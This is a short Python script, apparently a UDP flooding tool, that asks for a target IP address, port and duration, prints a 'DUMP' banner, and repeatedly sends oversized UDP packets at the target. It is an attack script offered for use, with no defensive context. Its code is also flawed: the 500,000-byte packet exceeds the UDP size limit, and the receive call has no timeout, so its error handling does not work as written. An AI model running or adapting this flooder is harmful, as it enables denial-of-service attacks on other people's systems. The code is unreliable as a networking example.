import socket
import time
import random

def send_udp_packets(ip, port, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = b'X' * 500000  # 500KB packet size
        start_time = time.time()
        packets_sent = 0
        packets_accepted = 0
        while (time.time() - start_time) < duration:
            sock.sendto(bytes_to_send, (ip, port))
            packets_sent += 1
            try:
                sock.recvfrom(1024)  # Receive a response to confirm packet acceptance (if applicable)
                packets_accepted += 1
            except socket.timeout:
                pass
            print(f"Sent {packets_sent} packets | Accepted: {packets_accepted}", end='\r')
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    print("██████╗░██╗░░░██╗███╗░░░███╗██████╗░")
    print("██╔══██╗██║░░░██║████╗░████║██╔══██╗")
    print("██║░░██║██║░░░██║██╔████╔██║██████╔╝")
    print("██║░░██║██║░░░██║██║╚██╔╝██║██╔═══╝░")
    print("██████╔╝╚██████╔╝██║░╚═╝░██║██║░░░░░")
    print("╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░")

    ip = input("Enter the IP address of the target: ")
    port = int(input("Enter the port number of the target: "))
    duration = int(input("Enter the duration to send UDP packets (in seconds): "))
    print("Sending UDP packets...")
    send_udp_packets(ip, port, duration)
    print("\nUDP packets sent successfully.")
